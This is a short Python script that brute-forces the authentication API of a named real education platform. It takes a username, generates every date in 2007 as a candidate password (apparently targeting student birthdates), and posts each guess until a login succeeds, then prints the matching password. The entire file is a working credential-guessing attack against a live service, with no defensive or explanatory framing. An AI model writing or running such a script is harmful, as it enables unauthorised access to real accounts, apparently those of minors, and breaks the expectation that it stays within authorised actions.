import requests
import time

url = 'https://education.habilec.fr/api/auth/authenticate'
uname = input('Username : ')
data = {'username': uname, 'password': ''}

dates = []
bases = []
year = 2007

for i in range(0, 12):
    i += 1
    bases.append(f'{i}'.zfill(2) + '/' + str(year))
print(bases)

for base in bases:
    for i in range(0, 31):
        i += 1
        dates.append((f'{i}'.zfill(2) + '/' + base))
print(len(dates))

for date in dates:
    data['password'] = date
    req = requests.post(url, data=data)
    if req.status_code in [201, 200]:
        if req.json()['success']:
            print(f'[{data["username"]}] {data["password"]}: YES')
            time.sleep(120)
            break
        else:
            print(f'[{data["username"]}] {data["password"]}: NO')
    else:
        print('ERROR !')
        break